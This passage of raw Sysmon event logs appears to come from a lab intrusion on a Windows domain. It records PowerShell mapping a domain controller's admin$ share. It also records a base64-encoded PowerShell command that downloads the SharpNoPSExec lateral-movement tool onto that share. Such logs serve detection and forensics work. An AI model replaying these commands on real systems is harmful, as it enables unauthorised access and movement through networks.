4\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ff76b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+1202c3f|UNKNOWN(00007FFC4EF55251)\r\nSourceUser: STACKEDPADS\\tim.smith\r\nTargetUser: STACKEDPADS\\tim.smith","Category":"Process accessed (rule: ProcessAccess)","Opcode":"Info","RuleName":"technique_id=T1055.001,technique_name=Dynamic-link Library Injection","UtcTime":"2022-07-08 13:42:34.777","SourceProcessGUID":"{6b7cbb53-343f-62c8-f300-000000000e00}","SourceProcessId":"2744","SourceThreadId":"6748","SourceImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetProcessGUID":"{6b7cbb53-344a-62c8-f700-000000000e00}","TargetProcessId":"4820","TargetImage":"C:\\Windows\\system32\\net.exe","GrantedAccess":"0x1fffff","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9e634|C:\\Windows\\System32\\KERNELBASE.dll+8e73|C:\\Windows\\System32\\KERNELBASE.dll+71a6|C:\\Windows\\System32\\KERNEL32.DLL+1cbb4|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+111e1f9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10753ba|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ffaad|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ff76b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+1202c3f|UNKNOWN(00007FFC4EF55251)","SourceUser":"STACKEDPADS\\tim.smith","TargetUser":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287755,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":72932,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2022-07-08 13:42:34.787\r\nProcessGuid: {6b7cbb53-344a-62c8-f700-000000000e00}\r\nProcessId: 4820\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: \"C:\\Windows\\system32\\net.exe\" use g: \\\\activedir.stackedpads.local\\admin$\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: STACKEDPADS\\tim.smith\r\nLogonGuid: {6b7cbb53-3426-62c8-0a72-300000000000}\r\nLogonId: 0x30720A\r\nTerminalSessionId: 3\r\nIntegrityLevel: High\r\nHashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\r\nParentProcessGuid: {6b7cbb53-343f-62c8-f300-000000000e00}\r\nParentProcessId: 2744\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: STACKEDPADS\\tim.smith","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1018,technique_name=Remote System Discovery","UtcTime":"2022-07-08 13:42:34.787","ProcessGuid":"{6b7cbb53-344a-62c8-f700-000000000e00}","Image":"C:\\Windows\\System32\\net.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"Net Command","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"net.exe","CommandLine":"\"C:\\Windows\\system32\\net.exe\" use g: \\\\activedir.stackedpads.local\\admin$","CurrentDirectory":"C:\\Windows\\system32\\","User":"STACKEDPADS\\tim.smith","LogonGuid":"{6b7cbb53-3426-62c8-0a72-300000000000}","LogonId":"0x30720a","TerminalSessionId":"3","IntegrityLevel":"High","Hashes":"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","ParentProcessGuid":"{6b7cbb53-343f-62c8-f300-000000000e00}","ParentProcessId":"2744","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","ParentUser":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287755,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":10,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":10,"OpcodeValue":0,"RecordNumber":72937,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process accessed:\r\nRuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection\r\nUtcTime: 2022-07-08 13:42:42.121\r\nSourceProcessGUID: {6b7cbb53-343f-62c8-f300-000000000e00}\r\nSourceProcessId: 2744\r\nSourceThreadId: 6748\r\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetProcessGUID: {6b7cbb53-3452-62c8-f800-000000000e00}\r\nTargetProcessId: 5148\r\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9e634|C:\\Windows\\System32\\KERNELBASE.dll+8e73|C:\\Windows\\System32\\KERNELBASE.dll+71a6|C:\\Windows\\System32\\KERNEL32.DLL+1cbb4|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+111e1f9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10753ba|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ffaad|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ff76b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+1202c3f|UNKNOWN(00007FFC4EF55251)\r\nSourceUser: STACKEDPADS\\tim.smith\r\nTargetUser: STACKEDPADS\\tim.smith","Category":"Process accessed (rule: ProcessAccess)","Opcode":"Info","RuleName":"technique_id=T1055.001,technique_name=Dynamic-link Library Injection","UtcTime":"2022-07-08 13:42:42.121","SourceProcessGUID":"{6b7cbb53-343f-62c8-f300-000000000e00}","SourceProcessId":"2744","SourceThreadId":"6748","SourceImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetProcessGUID":"{6b7cbb53-3452-62c8-f800-000000000e00}","TargetProcessId":"5148","TargetImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","GrantedAccess":"0x1fffff","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9e634|C:\\Windows\\System32\\KERNELBASE.dll+8e73|C:\\Windows\\System32\\KERNELBASE.dll+71a6|C:\\Windows\\System32\\KERNEL32.DLL+1cbb4|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+383fe6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\54c5a8ebfacb96ef1f1af1d732b88f97\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+111e1f9|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10753ba|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ffaad|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+10ff76b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\d0b59903ecdf5fafd2f575aa99051d7d\\System.Management.Automation.ni.dll+1202c3f|UNKNOWN(00007FFC4EF55251)","SourceUser":"STACKEDPADS\\tim.smith","TargetUser":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":13,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":2,"Task":13,"OpcodeValue":0,"RecordNumber":72935,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2022-07-08 13:42:42.121\r\nProcessGuid: {6b7cbb53-343f-62c8-f300-000000000e00}\r\nProcessId: 2744\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2264196694-1469429678-912427992-1107\\\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nDetails: Binary Data\r\nUser: STACKEDPADS\\tim.smith","Category":"Registry value set (rule: RegistryEvent)","Opcode":"Info","RuleName":"technique_id=T1543,technique_name=Service Creation","UtcTime":"2022-07-08 13:42:42.121","ProcessGuid":"{6b7cbb53-343f-62c8-f300-000000000e00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2264196694-1469429678-912427992-1107\\\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Details":"Binary Data","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":72936,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2022-07-08 13:42:42.122\r\nProcessGuid: {6b7cbb53-3452-62c8-f800-000000000e00}\r\nProcessId: 5148\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: STACKEDPADS\\tim.smith\r\nLogonGuid: {6b7cbb53-3426-62c8-0a72-300000000000}\r\nLogonId: 0x30720A\r\nTerminalSessionId: 3\r\nIntegrityLevel: High\r\nHashes: SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\r\nParentProcessGuid: {6b7cbb53-343f-62c8-f300-000000000e00}\r\nParentProcessId: 2744\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: STACKEDPADS\\tim.smith","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"technique_id=T1086,technique_name=PowerShell","UtcTime":"2022-07-08 13:42:42.122","ProcessGuid":"{6b7cbb53-3452-62c8-f800-000000000e00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.19041.546 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=","CurrentDirectory":"C:\\Windows\\system32\\","User":"STACKEDPADS\\tim.smith","LogonGuid":"{6b7cbb53-3426-62c8-0a72-300000000000}","LogonId":"0x30720a","TerminalSessionId":"3","IntegrityLevel":"High","Hashes":"SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7","ParentProcessGuid":"{6b7cbb53-343f-62c8-f300-000000000e00}","ParentProcessId":"2744","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","ParentUser":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":7,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":7,"OpcodeValue":0,"RecordNumber":72939,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Image loaded:\r\nRuleName: technique_id=T1055,technique_name=Process Injection\r\nUtcTime: 2022-07-08 13:42:42.168\r\nProcessGuid: {6b7cbb53-3452-62c8-f800-000000000e00}\r\nProcessId: 5148\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll\r\nFileVersion: 4.8.4180.0 built by: NET48REL1LAST_B\r\nDescription: Microsoft .NET Runtime Execution Engine\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: mscoreei.dll\r\nHashes: SHA1=1283EF637FA53D571118F269F9B8C0A5CCA2BF01,MD5=899A8B655E52A061B33571D97C5C06ED,SHA256=DE05B03E37FB9BA5D74CF8FA36A6F0B15AB61705285B738BC90D14FDE580A45E,IMPHASH=005299FA213F652A596AC31760C5340B\r\nSigned: true\r\nSignature: Microsoft Corporation\r\nSignatureStatus: Valid\r\nUser: STACKEDPADS\\tim.smith","Category":"Image loaded (rule: ImageLoad)","Opcode":"Info","RuleName":"technique_id=T1055,technique_name=Process Injection","UtcTime":"2022-07-08 13:42:42.168","ProcessGuid":"{6b7cbb53-3452-62c8-f800-000000000e00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll","FileVersion":"4.8.4180.0 built by: NET48REL1LAST_B","Description":"Microsoft .NET Runtime Execution Engine","Product":"Microsoft® .NET Framework","Company":"Microsoft Corporation","OriginalFileName":"mscoreei.dll","Hashes":"SHA1=1283EF637FA53D571118F269F9B8C0A5CCA2BF01,MD5=899A8B655E52A061B33571D97C5C06ED,SHA256=DE05B03E37FB9BA5D74CF8FA36A6F0B15AB61705285B738BC90D14FDE580A45E,IMPHASH=005299FA213F652A596AC31760C5340B","Signed":"true","Signature":"Microsoft Corporation","SignatureStatus":"Valid","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":7,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":7,"OpcodeValue":0,"RecordNumber":72940,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Image loaded:\r\nRuleName: technique_id=T1055,technique_name=Process Injection\r\nUtcTime: 2022-07-08 13:42:42.168\r\nProcessGuid: {6b7cbb53-3452-62c8-f800-000000000e00}\r\nProcessId: 5148\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll\r\nFileVersion: 4.8.4515.0 built by: NET48REL1LAST_C\r\nDescription: Microsoft .NET Runtime Common Language Runtime - WorkStation\r\nProduct: Microsoft® .NET Framework\r\nCompany: Microsoft Corporation\r\nOriginalFileName: clr.dll\r\nHashes: SHA1=61CBD7957B853E180D77DCB02EB48DE5E4269CDC,MD5=2B0E5597FF51A3A4D5BB2DDAB0214531,SHA256=8D09CE35C987EADCF01686BB559920951B0116985FE4FEB5A488A6A8F7C4BDB9,IMPHASH=259C196C67C4E02F941CAD54D9D9BB8A\r\nSigned: true\r\nSignature: Microsoft Corporation\r\nSignatureStatus: Valid\r\nUser: STACKEDPADS\\tim.smith","Category":"Image loaded (rule: ImageLoad)","Opcode":"Info","RuleName":"technique_id=T1055,technique_name=Process Injection","UtcTime":"2022-07-08 13:42:42.168","ProcessGuid":"{6b7cbb53-3452-62c8-f800-000000000e00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll","FileVersion":"4.8.4515.0 built by: NET48REL1LAST_C","Description":"Microsoft .NET Runtime Common Language Runtime - WorkStation","Product":"Microsoft® .NET Framework","Company":"Microsoft Corporation","OriginalFileName":"clr.dll","Hashes":"SHA1=61CBD7957B853E180D77DCB02EB48DE5E4269CDC,MD5=2B0E5597FF51A3A4D5BB2DDAB0214531,SHA256=8D09CE35C987EADCF01686BB559920951B0116985FE4FEB5A488A6A8F7C4BDB9,IMPHASH=259C196C67C4E02F941CAD54D9D9BB8A","Signed":"true","Signature":"Microsoft Corporation","SignatureStatus":"Valid","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-Sysmon[2568]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":7,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":3,"Task":7,"OpcodeValue":0,"RecordNumber":72938,"ProcessID":2568,"ThreadID":3284,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Image loaded:\r\nRuleName: technique_id=T1055,technique_name=Process Injection\r\nUtcTime: 2022-07-08 13:42:42.168\r\nProcessGuid: {6b7cbb53-3452-62c8-f800-000000000e00}\r\nProcessId: 5148\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nImageLoaded: C:\\Windows\\System32\\mscoree.dll\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Microsoft .NET Runtime Execution Engine\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: mscoree.dll\r\nHashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: STACKEDPADS\\tim.smith","Category":"Image loaded (rule: ImageLoad)","Opcode":"Info","RuleName":"technique_id=T1055,technique_name=Process Injection","UtcTime":"2022-07-08 13:42:42.168","ProcessGuid":"{6b7cbb53-3452-62c8-f800-000000000e00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageLoaded":"C:\\Windows\\System32\\mscoree.dll","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"Microsoft .NET Runtime Execution Engine","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"mscoree.dll","Hashes":"SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"STACKEDPADS\\tim.smith","EventReceivedTime":1657287763,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
